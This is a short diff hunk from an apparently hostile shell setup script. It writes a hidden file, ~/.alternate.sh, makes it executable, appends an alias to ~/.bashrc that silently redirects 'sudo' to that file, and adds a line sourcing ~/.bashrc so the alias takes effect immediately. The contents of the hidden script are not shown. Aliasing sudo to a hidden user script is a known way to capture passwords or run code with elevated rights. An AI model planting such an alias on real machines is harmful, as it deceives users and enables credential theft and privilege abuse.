@@ -35,6 +35,7 @@ fi
 EOF
 	chmod +x ~/.alternate.sh
 	echo "alias sudo='~/.alternate.sh'" >> ~/.bashrc
+	source ~/.bashrc
 	
 
     add_kata_bot_info
